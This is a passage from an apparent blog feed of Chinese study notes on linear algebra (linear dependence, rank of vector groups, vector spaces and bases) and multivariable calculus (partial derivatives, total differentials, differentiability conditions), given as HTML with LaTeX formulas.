组成的向量组可以记为 <span class="math display">\[
R:\alpha_1,\alpha_2,...,\alpha_m  或R=\{\alpha_1,\alpha_2,...,\alpha_m\}
\]</span></p>
<p><span class="math display">\[
例如矩阵A=(a_{ij})_{m*n}可以看称由n个m维列向量\\
\alpha_j=
\left(
\matrix
{a_{1j}\\a_{2j}\\...\\a_{mj}
}
\right)
\\
组成的向量组.称\alpha_1,\alpha_2,...,\alpha_m是矩阵A的列向量组
\]</span></p>
<p><span
class="math inline">\(\alpha\)</span>是n维向量，有n个分量；<span
class="math inline">\(R\)</span>是由m个n维向量组成的集合。</p>
<p>一个n*m的矩阵A，可以由m个<strong>n维行向量</strong>组成，也可以由n个<strong>m维列向量</strong>组成</p>
<p>对于线性方程组<strong>Ax=B</strong>，视为A为列向量组成的向量组，那么方程组可以写为<span
class="math inline">\(k_1\alpha_1+k_2\alpha_2+\dots+k_n\alpha_n=b\)</span></p>
<p>因而讨论方程组Ax=B是否有解的问题就是讨论b是否能由A的列向量线性表出。</p>
<p>n维单位坐标向量：</p>
<p><span class="math inline">\(\epsilon_i=(0,\dots,0,1,0,\dots,0)\space
\space(i=1,2,\dots,n)\)</span></p>
<p><span
class="math inline">\(\epsilon_i\)</span>中第i个分量为1，其余分量都是0.显然，任意一个n维向量<span
class="math inline">\(\alpha=(a_1,a_2,\dots,a_n)\)</span>都可以唯一地表示为这n个标准单位向量的线性组合</p>
<p><span
class="math inline">\(\alpha=a_1\epsilon_1+a_2\epsilon_2+\dots+a_n\epsilon_n\)</span></p>
<h2 id="定义5-线性相关无关">定义5 线性相关/无关</h2>
<p>设有n维向量<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>，若存在m个<strong>不全为零</strong>的实数<span
class="math inline">\(k_1,k_2,\dots,k_m\)</span>，使得<span
class="math inline">\(k_1\alpha_1+k_2\alpha_2+\dots+k_m\alpha_m=0\)</span>，则称<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span><strong>线性相关</strong>，称<span
class="math inline">\(k_1,k_2,\dots,k_m\)</span>为<strong>相关系数</strong>，否则称<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span><strong>线性无关</strong></p>
<p>换言之，向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>线性无关当且仅当<span
class="math inline">\(k_1=k_2=\dots=k_m=0\)</span>时，上式成立。</p>
<h2 id="定理1">定理1</h2>
<p>n维向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span> （ <span
class="math inline">\(m\geqslant2\)</span>）线性相关<span
class="math inline">\(\Leftrightarrow\)</span>至少存在某个 <span
class="math inline">\(\alpha_i\)</span> 是其余向量的线性组合</p>
<p>n维向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>（ <span
class="math inline">\(m\geqslant2\)</span>）线性无关<span
class="math inline">\(\Leftrightarrow\)</span>任意一个 <span
class="math inline">\(\alpha_i\)</span> 都不能由其余向量线性表出</p>
<p>由定义5易知：</p>
<p>(1)任意一个含有零向量的向量组必为线性相关组</p>
<p>(2)单个向量<span class="math inline">\(\alpha\)</span>线性相关<span
class="math inline">\(\Leftrightarrow\)</span><span
class="math inline">\(\alpha=0\)</span>，即单个向量<span
class="math inline">\(\alpha\)</span>线性无关<span
class="math inline">\(\Leftrightarrow\alpha\neq0\)</span></p>
<p>(3)两个非零的n维向量<span
class="math inline">\(\alpha，\beta\)</span>线性相关当且仅当存在不全为零的数k,l使得<span
class="math inline">\(k\alpha+l\beta=0\)</span>，即<span
class="math inline">\(\alpha=-\frac{l}{k}\beta\)</span>或<span
class="math inline">\(\beta=-\frac{k}{l}\)</span></p>
<p>这说明<span class="math inline">\(\alpha\)</span>和<span
class="math inline">\(\beta\)</span>共线，即它们的对应分量成比例</p>
<h2 id="判断线性相关的基本方法和步骤">判断线性相关的基本方法和步骤</h2>
<p>n维向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span></p>
<p>1.假定存在一组数<span
class="math inline">\(k_1,k_2,\dots,k_m\)</span>使得<span
class="math inline">\(k_1\alpha_1+k_2\alpha_2+\dots+k_m\alpha_m=0\)</span></p>
<p>2.列出未知量<span
class="math inline">\(k_1,k_2,\dots,k_m\)</span>的齐次线性方程组</p>
<p>3.判断方程组有无非零解</p>
<p>4.若有非零解，则线性相关；若仅有零解，则线性无关</p>
<p>线性相关——向量组中存在可替代性——存在冗余信息</p>
<h2 id="定理2">定理2</h2>
<p>如果向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>线性无关，而向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m,\beta\)</span>线性相关，则<span
class="math inline">\(\beta\)</span>可以用<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>唯一线性表出</p>
<h1 id="线性相关性的判别定理">线性相关性的判别定理</h1>
<p>对于一个有<strong>m个向量</strong>的<strong>n维</strong>向量组，线性相关性判定来说
<span class="math display">\[
\begin{split}
R：\alpha_j=\left(\matrix{a_{1},a_{2},\cdots,a_{n}}\right)^T\\
若该向量组线性&amp;相关，则有\\
k_1a_{1}+k_2a_2+\dots+k_na_n=&amp;0\space该方程存在非零解
\end{split}
\]</span> n维相当于有n个方程，即<strong>约束个数</strong></p>
<p>m个向量相当于有m个未知数，即<strong>未知数个数</strong></p>
<p>当向量个数大于向量维数时，方程组存在自由未知量，则必有非零解</p>
<p>k₁,k₂，...,k ₙ为未知数</p>
<h2 id="定理3">定理3</h2>
<p><span class="math display">\[
若\alpha_1,\alpha_2,...,\alpha_r线性相关，则\alpha_1,\alpha_2,\cdots,\alpha_r,\alpha_{r+1},\cdots,\alpha_m也线性相关
\]</span></p>
<p><strong>相关组的扩充向量组必为相关组</strong> or
<strong>部分相关，整体相关</strong></p>
<p>⇔</p>
<p><strong>无关组的子向量组必为无关组</strong> or
<strong>整体无关，部分必无关</strong></p>
<p>向量组扩充<span
class="math inline">\(\rightarrow\)</span>增加向量个数<span
class="math inline">\(\rightarrow\)</span>增加未知数个数</p>
<h3 id="推论">推论</h3>
<p>若向量中含有零向量，则此向量组线性相关</p>
<p>由此可知，线性无关向量组中一定不含有零向量</p>
<h2 id="定理4">定理4</h2>
<p>设有两个向量组 <span class="math display">\[
\begin{split}
R：\alpha_j&amp;=\left(\matrix{a_{1j},a_{2j},\cdots,a_{nj}}\right)^T  \space\
(j=1,2,3,\dots,m)\\
S：\beta_j&amp;=\left(\matrix{a_{p_1j},a_{p_2j},\cdots,a_{p_nj}}\right)^T  \space\
(j=1,2,3,\dots,m)\\
其中p_1p_2\dots,p_n是自然数1,2&amp;,\dots,n的某个确定的排列，则向量组R与向量组S的线性相关性相同
\end{split}
\]</span> 即向量组内向量相同，排放位置不同，线性相关性相同</p>
<h2 id="定理5">定理5</h2>
<p>设有两个向量组，它们的前r个向量对应相同 <span class="math display">\[
\begin{split}
S：\beta_j=\left(\matrix{a_{1j},a_{2j},&amp;\cdots,a_{rj},a_{r+1,j}}\right)^T  \space\
(j=1,2,3,\dots,m)\\
如果\beta_1,\beta_2,\dots,\beta_m为线性相关组，则\alpha_1,\alpha_2,\dots,\alpha_m必为线性相关&amp;组
\end{split}
\]</span> 方程理解：前r个方程有非零解，则再添加方程个数，方程依旧有解
<span class="math display">\[
\begin{split}
把向量组\beta_1,\beta_2,\dots,\beta_m称为向量&amp;组\alpha_1,\alpha_2,\dots,\alpha_m的^”接长^“向量组\\
而把向量组\alpha_1,\alpha_2,\dots,\alpha_m称为向&amp;量组\beta_1,\beta_2,\dots,\beta_m的^”截短^“向量组\\
\end{split}
\]</span></p>
<p><strong>短的无关，长的无关</strong></p>
<p>较少约束时无解，增加约束也无解</p>
<p><strong>长的有关，短的有关</strong></p>
<p>较多约束时有解，减少约束也有解</p>
<p><strong>长短指的是向量维数，即线性方程组的方程个数</strong></p>
<h2 id="推论-1">推论</h2>
<p>r维向量组的每个向量添上n-r个分量，成为n维向量组.若r维向量组线性无关，则n维向量组也线性无关，即<strong>短的无关，长的无关</strong></p>
<p>n-r次应用定理5，每次添上一个向量即可得到结论</p>
<h2 id="定理6">定理6</h2>
<p>向量组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>线性相关的充要条件是它所构成的矩阵<span
class="math inline">\(A=(\alpha_1,\alpha_2,\dots,\alpha_m)\)</span>的秩小于向量个数m；该向量组线性无关的充分必要条件是r(A)=m</p>
<h3 id="推论1">推论1</h3>
<p>n个n维向量线性无关的充分必要条件是它们构成的方阵的行列式不为0</p>
<h3 id="推论2">推论2</h3>
<p>当m&gt;n时，m个n维向量<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_m\)</span>一定线性相关</p>
<p>向量个数（未知量个数）&gt;向量维数（方程个数），则必有自由未知量的产生</p>
<h1 id="向量组的秩">向量组的秩</h1>
<h2 id="定义6-向量组等价">定义6 向量组等价</h2>
<p>设有两个n维向量组<span
class="math inline">\(R:\{\alpha_{1},\alpha_{2},\cdots,\alpha_{r}\}\)</span>，<span
class="math inline">\(S：\{\beta_{1},\beta_{2},\cdots,\beta_{s}\}\)</span></p>
<p>若向量组R中的每一个向量<span
class="math inline">\(\alpha_i\)</span>都可以由向量组S中的向量<span
class="math inline">\(\beta_{1},\beta_{2},\cdots,\beta_{s}\)</span>线性表出，则称向量组R可以由向量组S线性表出，若向量组S也可以由向量组R线性表出，那则称这两个向量组等价</p>
<p>可以将向量组R由向量组S线性表出记为：<strong>R=SK</strong>，K为系数矩阵，K为r*s的矩阵</p>
<p>向量组之间的线性表出关系具有传递性</p>
<p>向量组之间的等价关系具有：<strong>反身性，对称性，传递性</strong></p>
<h2 id="定义7-向量组的秩">定义7 向量组的秩</h2>
<p>若T是由若干个（有限个或无限多个）向量组成的向量组。若存在T的一个部分组<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_r\)</span>满足以下条件：</p>
<p>(1)<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_r\)</span>线性无关</p>
<p>(2)对于任意一个向量<span class="math inline">\(\beta\in
T\)</span>，向量组<span
class="math inline">\(\beta,\alpha_1,\alpha_2,\dots,\alpha_r\)</span>都线性相关</p>
<p>则称<span
class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_r\)</span>为T的一个极大线性无关组向量组，简称为极大无关组.极大线性无关组所含向量的个数r称为向量组T的秩</p>
<p>只含零向量的向量组没有极大线性无关组，规定它的秩为0</p>
<h2 id="定理7">定理7</h2>
<p>向量组T与它的一个极大线性无关组等价，因而T的任意两个极大无关组等价</p>
<p>R<sup>n</sup>的任意n个线性无关向量都构成R<sup>n</sup>中的极大无关组</p>
<h2 id="定理8">定理8</h2>
<p>设向量组R的秩为r，向量组S的秩为s，若向量组R可由向量组S线性表出，则必有<span
class="math inline">\(r\leqslant s\)</span></p>
<h3 id="推论1-1">推论1</h3>
<p>等价的向量组必有相同的秩</p>
<h3 id="推论2-1">推论2</h3>
<p>任意两个线性无关的等价向量组所含向量个数相等</p>
<p>等价的向量组一定由相同的秩，但秩相等的两个向量组未必等价</p>
<h2 id="向量组的秩-1">向量组的秩</h2>
<p>设A是一个<span class="math inline">\(m\times n\)</span>矩阵</p>
<p><span class="math inline">\(A=\space\left(
\begin{matrix}
a_{11} &amp; a_{12} &amp;\dots &amp;a_{1n}\\
a_{21} &amp; a_{22} &amp;\dots &amp;a_{2n}\\
\vdots &amp;\vdots &amp; &amp;\vdots\\
a_{m1} &amp; a_{m2} &amp;\dots &amp;a_{mn}\end{matrix}
\right)\space\)</span></p>
<p>将矩阵A分别按行分块和按列分块</p>
<p><span class="math inline">\(A=\space\left(
\begin{matrix}
\alpha_1\\
\alpha_2\\
\vdots\\
\alpha_m
\end{matrix}
\right)，其中\alpha_i=
\left(
\begin{matrix}
a_{i1},a_{i2},\dots,a_{in}
\end{matrix}
\right)
(i=1,2,\dots,m)\)</span></p>
<p><span class="math inline">\(A=\left(
\begin{matrix}
\beta_1,\beta_2,\dots,\beta_n
\end{matrix}
\right)
其中，\beta_j=
\left(
\begin{matrix}
a_{1j}\\
a_{2j}\\
\vdots \\
a_{mj}
\end{matrix}
\right)
(j=1,2,\dots,n)\)</span></p>
<p>于是矩阵A对应两个向量组（分别为n维行向量组和m维列向量组），<span
class="math inline">\(M=\left(
\begin{matrix}
\alpha_1,
\alpha_2,
\cdots,
\alpha_m
\end{matrix}
\right),N=\left(
\begin{matrix}
\beta_1,\beta_2,\cdots,\beta_n
\end{matrix}
\right)\)</span></p>
<p>称M为A的行向量组，N为A的列向量组</p>
<h2 id="定义8">定义8</h2>
<p>矩阵A的行向量组M的秩称为A的行秩；列向量组N的秩称为A的列秩</p>
<h2 id="定理9">定理9</h2>
<p>矩阵的秩等于它的列秩，也等于它的行秩</p>
<p>一般地，将一个向量组<span
class="math inline">\(\begin{matrix}\alpha_1,\alpha_2,\cdots,\alpha_m\end{matrix}\)</span>的秩记作秩<span
class="math inline">\(\left(\begin{matrix}\alpha_1,\alpha_2,\cdots,\alpha_m\end{matrix}\right)\)</span></p>
<h2 id="定理10">定理10</h2>
<p>矩阵A经过<strong>初等行变换</strong>化为矩阵B，则A的列向量组的任一部分组与B的列向量组的对应部分组有相同的线性组合关系</p>
<h2 id="求向量组的秩">求向量组的秩</h2>
<p>(1)把向量组排成矩阵</p>
<p>(2)把矩阵化成行阶梯形矩阵</p>
<p>(3)把矩阵化为行最简形矩阵（用极大无关组向量表示其他向量）</p>
<p>由定理10可知，初等行变化后对应部分组具有相同的线性组合关系，便能得到线性表示关系</p>
<h1 id="向量空间">向量空间</h1>
<h2 id="定义9">定义9</h2>
<p>设V是n维向量构成的非空集合，且满足</p>
<p>(1)若<span class="math inline">\(\alpha,\beta\in V,\)</span> 则 <span
class="math inline">\(\alpha+\beta \in
V\)</span>（V对向量的加法封闭）</p>
<p>(2)若<span class="math inline">\(\forall \alpha \in V\)</span>，及
<span class="math inline">\(\forall k \in R\)</span>，都有<span
class="math inline">\(k\alpha \in
V\)</span>（V对向量的数乘运算封闭）</p>
<p>则称集合V是<strong>向量空间</strong></p>
<p>上述两个条件可以合并为 <span
class="math inline">\(\forall\alpha,\beta\in V,\forall k,l \in
R,都有k\alpha+l\beta\in V\)</span></p>
<p>全体n为行（列）向量的集合也构成向量空间，记为R<sup>n</sup></p>
<h2 id="定义10">定义10</h2>
<p>设V<sub>1</sub>和V<sub>2</sub>都是向量空间，且<span
class="math inline">\(V_1\subseteq V_2\)</span>，则称<span
class="math inline">\(V_1\)</span>是<span
class="math inline">\(V_2\)</span>的子空间</p>
<p>特别地，V={0}是向量空间，称为零空间</p>
<p>在任意一个向量空间V中一定包含零向量</p>
<p>由V不是空集得到<span class="math inline">\(\forall \alpha \in
V,满足-\alpha=(-1)\alpha\in V\)</span> 于是由封闭性知<span
class="math inline">\(\alpha+(-1)\alpha=0\in V\)</span></p>
<p>我们可以把零向量称为向量空间的“原点”</p>
<h2 id="生成空间">生成空间</h2>
<p>设<span class="math inline">\(\alpha,\beta\)</span>
是两个已知的n维向量，集合<span class="math inline">\(V=\{x=\lambda
\alpha+\mu\beta|\lambda,\mu \in R\}\)</span>是一个向量空间</p>
<p>这个向量空间称为由向量<span
class="math inline">\(\alpha,\beta\)</span>生成的向量空间</p>
<p>一般地，任意取定向量组<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_m\in
R^n\)</span>，则可证明由它们的线性组合全体所组成的向量集合</p>
<p><span
class="math inline">\(V=\{\alpha=k_1\alpha_1,k_2\alpha_2,\cdots,k_m\alpha_m|\forall
k_i\in R,j=1,2,\cdots,m\}\)</span></p>
<p>是<span class="math inline">\(R^n\)</span>的一个向量空间，记为<span
class="math inline">\(V=L(\alpha_1,\alpha_2,\cdots,\alpha_n)\)</span>，并称它为由<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_m\)</span><strong>生成的向量空间</strong></p>
<h2 id="定义11-基基向量维数">定义11 基，基向量，维数</h2>
<p>设V是<span
class="math inline">\(R^n\)</span>的一个子空间。若V中的向量组<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_r\)</span>满足：</p>
<p>(1)<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_r\)</span>线性无关</p>
<p>(2)V中的任意一个向量<span
class="math inline">\(\alpha\)</span>都可以由向量组<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_r\)</span>线性表出：</p>
<p>即存在常数<span class="math inline">\(k_1,k_2,\cdots,k_r\in
R\)</span>使得<span
class="math inline">\(\alpha=k_1\alpha_1,k_2\alpha_2,\cdots,k_r\alpha_r\)</span>，则称向量组)<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_r\)</span>为向量空间V的一个<strong>基</strong>，</p>
<p>其中每个<span
class="math inline">\(\alpha_i(i=1,2,\cdots,r)\)</span>都称为<strong>基向量</strong>.基中所含向量的个数r称为V的<strong>维数</strong>，记为<span
class="math inline">\(dimV=r\)</span>，并称V为r维向量空间</p>
<p>零空间的维数为0</p>
<p>向量空间V的一个基实际上就是向量集合V中的一个<strong>极大线性无关组</strong>，V的维数就是极大无关组中所含向量的个数，也即V的秩</p>
<p><span class="math inline">\(R^n\)</span>
中任意n个线性无关的向量都是<span
class="math inline">\(R^n\)</span>的一个基</p>
<p>R<sup>3</sup>中过原点的直线是一维子空间，过原点的屏平面是二维子空间</p>
<p>由向量组生成的线性子空间的<strong>维数</strong>即为该向量组的秩，其<strong>基</strong>为该向量组的<strong>一个极大线性无关组</strong></p>
<h2 id="定义12">定义12</h2>
<p>设<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_n\)</span>是n维向量空间的一个基，向量空间V中的任意一个向量<span
class="math inline">\(\alpha\)</span> 都可唯一地表示为</p>
<p><span
class="math inline">\(\alpha=x_1\alpha_1+x_2\alpha_2+\cdots+x_n\alpha_r\)</span>，</p>
<p><span
class="math inline">\(\alpha_i(i=1,2,\cdots,n)\)</span>的系数构成的有序数组<span
class="math inline">\(x_1,x_2,\cdots,x_n\)</span> 称为向量<span
class="math inline">\(\alpha\)</span> 在基<span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_n\)</span>下的<strong>坐标</strong></p>
<p>同一个向量在不同的下有不同的坐标向量。求坐标向量的方法就是求表出系数，也就是解线性方程组</p>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>Linear Algebra</tag>
        <tag>vector</tag>
      </tags>
  </entry>
  <entry>
    <title>多元函数微分学</title>
    <url>/archives/58a6f505.html</url>
    <content><![CDATA[<h1 id="偏导数">偏导数</h1>
<p>​ 令一个自变量固定，研究一个自变量的变化率</p>
<blockquote>
<p>定义（偏导数）：设函数z=f(x,y)在点<span
class="math inline">\((x_0,y_0)\)</span>的某一邻域U<span
class="math inline">\((x_0,y_0)\)</span>内有定义，当自变量y固定在<span
class="math inline">\(y=y_0\)</span>,而x在<span
class="math inline">\(x_0\)</span>有改变量<span
class="math inline">\(\Delta x,(x_0+\Delta x,y_0)\in
U(x_0,y_0)\)</span>时，相应地，函数f有改变量 <span
class="math display">\[
f(x_0+\Delta x,y_0)-f(x_0,y_0)
\]</span> 如果极限 <span class="math display">\[
\lim _{\Delta x\to 0}\frac{f(x_0+\Delta x,y_0)-f(x_0,y_0)}{\Delta x}
\]</span> 存在，则称此极限值为函数<span
class="math inline">\(z=f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处对x的偏导数，记作 <span
class="math display">\[
f_x(x_0,y_0),\frac{\partial f(x_0,y_0)}{\partial
x},z_x(x_0,y_0)或\frac{\partial z}{\partial x} |_{(x_0,y_0)}
\]</span> 即 <span class="math display">\[
f_x(x_0,y_0)=\frac{\partial f(x_0,y_0)}{\partial x}=\lim _{\Delta x\to
0}\frac{f(x_0+\Delta x,y_0)-f(x_0,y_0)}{\Delta x}
\]</span> <span id="more"></span> ​ 如果二元函数<span
class="math inline">\(z=f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处对x与y的偏导数均存在，那么称<span
class="math inline">\(f(x,y)\)</span>在<span
class="math inline">\((x_0,y_0)\)</span>处可偏导.</p>
</blockquote>
<p>​ 把其中一个自变量固定，对另一个自变量求导.</p>
<p>​ <strong>注意，可偏导不一定可连续</strong></p>
<p>​
偏导只能保证当点(x,y)分别沿平行于x轴和y轴两个<strong>特殊路径</strong>趋于点<span
class="math inline">\((x_0,y_0)\)</span>时，<span
class="math inline">\(f(x,y)\to f(x_0,y_0)\)</span>，不能保证当点<span
class="math inline">\((x,y)\)</span>以<strong>任意路径和方式</strong>趋于点<span
class="math inline">\((x_0,y_0)\)</span>时，都有<span
class="math inline">\(f(x,y)\to f(x_0,y_0)\)</span>,所以不能保证<span
class="math inline">\(f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>连续</p>
<h2 id="几何意义">几何意义</h2>
<p>​ 固定y，即<span
class="math inline">\(y=y_0\)</span>的平面对函数曲面的截面，对x求导，即得到截面的函数曲线的斜率</p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230418163204860.png" /></p>
<h2 id="notes">Notes</h2>
<p>​ 对于n元函数求偏导，也是固定n-1个变量，对剩余的变量求偏导</p>
<h1 id="全微分">全微分</h1>
<p>​ 一元函数的微分：对于一元函数<span
class="math inline">\(f:U(x_0)\subseteq R \to
R\)</span>，若存在一个关于<span class="math inline">\(\Delta
x\)</span>的线性函数<span class="math inline">\(L(\Delta x)=a\Delta
x\)</span>，使得函数的改变量可表示为: <span class="math display">\[
f(x_0+\Delta x)-f(x_0)=a \Delta x+o(\Delta x)
\]</span> ​ 其中常数<span class="math inline">\(a\)</span>与<span
class="math inline">\(\Delta x\)</span>无关，<span
class="math inline">\(o(\Delta x)\)</span>是当<span
class="math inline">\(\Delta x\to 0\)</span>时关于<span
class="math inline">\(\Delta
x\)</span>的高阶无穷小，则称f在点x<sub>0</sub>处可微，且称函数改变量的线性主部<span
class="math inline">\(a\Delta x\)</span>为f在x<sub>0</sub>处的微分.</p>
<p>​ 由此我们能得到二元函数的全微分：</p>
<p>​ 设二元函数z=f(x,y)在点<span class="math inline">\((x_0,y_0)\)</span>
的某邻域<span
class="math inline">\(U(x_0,y_0)\)</span>内有定义.如果对于<span
class="math inline">\((x_0+\Delta x,y_0+\Delta y)\in
U(x_0,y_0)\)</span>，函数f在<span
class="math inline">\((x_0,y_0)\)</span>处的改变量 <span
class="math display">\[
\Delta z=f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)
\]</span> ​ 可以表示为: <span class="math display">\[
\Delta z=a_1\Delta x+a_2\Delta y+o(p)
\]</span> ​ 其中，<span
class="math inline">\(\alpha_1,\alpha_2\)</span>是与<span
class="math inline">\(\Delta x,\Delta
y\)</span>无关的两个常数（但与一般点<span
class="math inline">\((x_0,y_0)\)</span>有关)，<span
class="math inline">\(p=\sqrt{(\Delta x)^2+(\Delta
y)^2},o(p)\)</span>是当<span class="math inline">\(p\to 0(即\Delta x\to
0,\Delta y\to 0)\)</span>时关于p的高阶无穷小，则称函数f在点<span
class="math inline">\((x_0,y_0)\)</span>处可微，并称<span
class="math inline">\(a_1\Delta x+a_2\Delta y\)</span> 为函数f在点<span
class="math inline">\((x_0,y_0)\)</span>处的全微分记作<span
class="math inline">\(dz \mid _{(x_0,y_0)}\)</span>或<span
class="math inline">\(df(x_0,y_0)\)</span> <span class="math display">\[
dz\mid _{(x_0,y_0)}=a_1 \Delta x+ a_2 \Delta y
\]</span> ​ 也即是 <span class="math display">\[
dz\mid _{(x_0,y_0)}=a_1 dx+ a_2 dy
\]</span> ​ 当p充分小，且a<sub>1</sub>，a<sub>2</sub>不为0时，全微分<span
class="math inline">\(dz\mid _{(x_0,y_0)}\)</span>就是函数f在<span
class="math inline">\((x_0,y_0)\)</span>处的<strong>线性主部</strong></p>
<h2 id="可微的必要条件">可微的必要条件</h2>
<p>​ 设函数<span class="math inline">\(z=f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处可微，则</p>
<ol type="1">
<li><p>f在<span
class="math inline">\((x_0,y_0)\)</span>处<strong>连续</strong></p></li>
<li><p>f在<span
class="math inline">\((x_0,y_0)\)</span>处的两个<strong>偏导数均存在</strong>，且有<span
class="math inline">\(a_1=f_x(x_0,y_0),a_2=f_y(x_0,y_0)\)</span>即 <span
class="math display">\[
df(x_0,y_0)=f_x(x_0,y_0)dx+f_y(x_0,y_0)dy
\]</span></p></li>
</ol>
<blockquote>
<p>证明可微得到偏导存在：</p>
<p>​ 由可微的定义，函数f在<span
class="math inline">\((x_0,y_0)\)</span>处的改变量可表示为： <span
class="math display">\[
f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)=a_1 \Delta x+ a_2 \Delta y+o(p)
\]</span> ​ 取<span class="math inline">\(\Delta y=0\)</span>，则有<span
class="math inline">\(\rho=|\Delta x|\)</span>，上式变为： <span
class="math display">\[
f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)=a_1 \Delta x+o(|x|)
\]</span> ​ 所以： <span class="math display">\[
\lim _{\Delta x\to 0}\frac{f(x_0+\Delta x,y_0)-f(x_0,y_0)}{\Delta
x}=\lim _{\Delta x\to 0}[a_1+\frac{o(|x|)}{\Delta x}]=a_1
\]</span> ​ 即在点<span class="math inline">\((x_0,y_0)\)</span>处<span
class="math inline">\(f(x,y)\)</span>对x的偏导数存在且<span
class="math inline">\(f_x(x_0,y_0)=a_1\)</span></p>
<p>​ 同理可得，当取<span class="math inline">\(\Delta
x=0\)</span>时，可得到在该点对y的偏导数也存在且<span
class="math inline">\(f_y(x_0,y_0)=a_2\)</span></p>
</blockquote>
<p>​ 当<span class="math inline">\(z=f(x,y)\)</span>在<span
class="math inline">\(x_0=(x_0,y_0)\)</span>处可微时，f在<span
class="math inline">\(x_0\)</span>处的改变量必可表示为： <span
class="math display">\[
\Delta z=f_x(x_0)\Delta x+f_y(x_0)\Delta y+o(\rho)
\]</span> ​ 其中<span class="math inline">\(o(\rho)\)</span>是当<span
class="math inline">\(\rho \to 0\)</span>时关于<span
class="math inline">\(\rho\)</span>的高阶无穷小；反之，若<span
class="math inline">\(\Delta
z\)</span>可表示为上式，则由全微分的定义可知：<span
class="math inline">\(f\)</span>在<span
class="math inline">\(x_0\)</span>处可微.</p>
<p>​ 若<span class="math inline">\(z=f(x,y)\)</span>在区域<span
class="math inline">\(\Omega\subseteq
R^2\)</span>的每一点处都可微，则称f是<span
class="math inline">\(\Omega\)</span>内的可微函数，此时，有 <span
class="math display">\[
dz=f_xdx+f_ydy
\]</span> ​
多元函数在一点处连续而且所有的偏导数都存在也不能保证其在该点可微.</p>
<h2 id="可微的充分条件">可微的充分条件</h2>
<p>​ 设函数<span class="math inline">\(z=f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>的某邻域有定义，若<span
class="math inline">\(f(x,y)\)</span>的两个偏导数均在点<span
class="math inline">\((x_0,y_0)\)</span>处连续，则该函数在点<span
class="math inline">\((x_0,y_0)\)</span>处可微.（<strong>即偏导数存在且连续</strong>）</p>
<blockquote>
<p>证明：</p>
<p>​ 证明可微，证明<span class="math inline">\(\Delta z=f_x(x_0)\Delta
x+f_y(x_0)\Delta y+o(p)\)</span>成立即可</p>
<p>​ 首先通过插项的方法把二元函数的改变量转化为一元函数的改变量</p>
<p><span class="math display">\[\begin{align*}

\Delta z&amp;=f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)\\&amp;=
[f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0+\Delta y)]+[f(x_0,y_0+\Delta
y)-f(x_0,y_0)]

\end{align*}\]</span></p>
<p>​
上式右端中每一方括号内都是一元函数的改变量，由Lagrange微分中值公式，存在<span
class="math inline">\(\theta
_i(0&lt;\theta_i&lt;1,i=1,2)\)</span>使得上式化为： <span
class="math display">\[
\Delta z=f_x(x_0+\theta_1 \Delta x,y_0+\Delta y)\Delta
x+f_y(x_0,y_0+\theta_2\Delta y)\Delta y
\]</span> ​ 由于<span
class="math inline">\(f_x(x,y)在(x_0,y_0)\)</span>连续，有： <span
class="math display">\[
  \lim_{\rho \to 0}f_x(x_0+\theta_1\Delta x,y_0+\Delta y)=f_x(x_0,y_0)
\]</span> ​ 其中<span class="math inline">\(\rho =\sqrt{\Delta x^2+\Delta
y^2}\)</span>，因此有 <span class="math display">\[
f_x(x_0+\theta_1\Delta x,y_0+\Delta y)=f_x(x_0,y_0)+\alpha_1(\rho)
\]</span> ​ 其中<span
class="math inline">\(\alpha_1(\rho)\)</span>是当<span
class="math inline">\(\rho \to 0\)</span>时的无穷小.同理可得： <span
class="math display">\[
  f_y(x_0,y_0+\theta_2\Delta y)=f_y(x_0,y_0)+\alpha_2(\rho)
\]</span> ​ 其中<span
class="math inline">\(\alpha_2(\rho)\)</span>是当<span
class="math inline">\(\rho \to 0\)</span>时的无穷小.</p>
<p>​ 最后得到： <span class="math display">\[
\Delta z=f_x(x_0,y_0)\Delta x+f_y(x_0,y_0)\Delta y+a_1(\rho)\Delta
x+a_2(\rho) \Delta y
\]</span> ​ 由： <span class="math display">\[
\left| \frac{a_1(\rho)\Delta x+a_2(\rho)\Delta y}{\rho}
\right| \le |a_1(\rho)|+|a_2(\rho)|
\]</span> ​ 易知： <span class="math display">\[
\lim _{\rho \to 0}\frac{a_1(\rho)\Delta x+a_2(\rho)\Delta y}{\rho}=0
\]</span> ​ 所以： <span class="math display">\[
a_1(\rho)\Delta x+a_2(\rho)\Delta y=o(\rho)
